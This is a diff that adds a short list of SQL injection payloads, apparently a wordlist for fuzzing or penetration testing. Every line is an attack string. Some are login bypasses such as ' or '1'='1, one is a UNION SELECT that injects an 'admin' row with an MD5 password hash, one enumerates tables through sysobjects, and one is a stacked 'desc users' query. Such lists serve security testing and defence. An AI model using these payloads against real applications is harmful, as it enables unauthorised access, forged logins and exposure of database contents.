@@ -1,0 +1,12 @@
+a' or 1=1;#
+a' or '1'='1';#
+x' and userid is NULL;# 
+x' and email is NULL;#
+\'; desc users;#
+anything' or 'x' = 'x
+' or '1' = '1
+'  )  )   or   (  (  'x'  )  )   =   (  (  'x
+"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055"
+"admin"" )  or  ( ""1"" = ""1" 
+"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype  =  'u'#"
+" select * from users where id = 1 or ""%{"" or 1=1#1"
